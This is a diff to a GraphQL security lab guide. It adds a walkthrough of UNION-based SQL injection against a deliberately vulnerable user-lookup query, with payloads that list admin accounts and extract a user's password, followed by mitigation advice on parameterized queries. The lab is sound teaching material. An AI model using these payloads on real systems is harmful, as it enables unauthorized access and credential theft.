@@ -65,9 +65,78 @@ As you have observed, the applciation took additional extra 5 seconds to respond
 Now, it' up to you to come up with scenario how to further abuse this.
 
 ### SQL Injection
-TODO
+Staying on the same `/admin` we also see *Query User detiails* functionality which allowes an Administrator to get information about users by providing `username` values.
+
+Go aronud find locate the GraphQL query that executes this transaction. 
+
+Now try to fetch some information for valid or invalid users. How about trying some SQL Injection payloads? :)
+
+
+```
+Example:
+' UNION SELECT uuid, username FROM users --")
+```
+
+By now we are aboslutly sure that this is an SQL Injection point and it is pretty that we are dealing with UNION style SQL Injection. 
+Next up, let's try to find the other blog admins:
+```
+{getUser(username:"' UNION SELECT uuid, username, null, null FROM users WHERE isadmin = true --") {
+  id
+  username
+}}
+```
+
+Lets try to get the password of some user:
+```
+{getUser(username:"' UNION SELECT uuid, username, password, null FROM users WHERE username = 'johndoe'  --") {
+  id
+  username
+}}
+```
+
+We face few hurdles here:
+  * The query only returns one row (the first row)
+  * We cannot see the `password` value as our GraphQL `UserObject` model excludes the `password` column/field
+  ```
+  class UserObject(SQLAlchemyObjectType):
+     class Meta:
+         model = User
+         exclude_fields = ('password') #this hides the password in the query for the Users
+         filter_fields = {
+              'username': ['exact', 'icontains', 'istartswith']
+          }
+         interfaces = (graphene.relay.Node, )
+  ```
+
+
+This means we need to get the password out from the UNION SELECT in another variable that is passed back.
+
+The laziest approach, if our target is to get the password, is to return in all fields:
+```
+{getUser(username:"' UNION SELECT password, password, password, password FROM users WHERE username = 'johndoe'  --") {
+  id
+  username
+  
+}}
+```
+
+w00t w00t!
+
+What else can you!?
 
 
 ## Fix
+
+### OS Command Injection
 By know you fully understand that GraphQL does not handle input validation or santization for you. It actually has nothing to do with it. So, fixing the code in this lab does not differ to any of your previous practices on fixing code for OS Command Line injection.
+
+### SQL Injection
+SQL Injections have been present and known as vulnerability for such a long time which means that the mitigations are known, documented and well explained. Mitigating against SQL Injections when it comes to GraphQL powered applications are the same as for any other technology.
+In this particular project we use SQLAlchemy as ORM and graphane_sqlalchemy implemetation which is one common use case. However, as can be seen in our example mistakes can be made if we concatinate unsanitized, user provided string input to our SQLAlchemy queries.
+
+The solution? 
+ * Sanitize the input
+ * Use parameterized queries
+ * Use SQLAlchemy as described in documentation
+
 
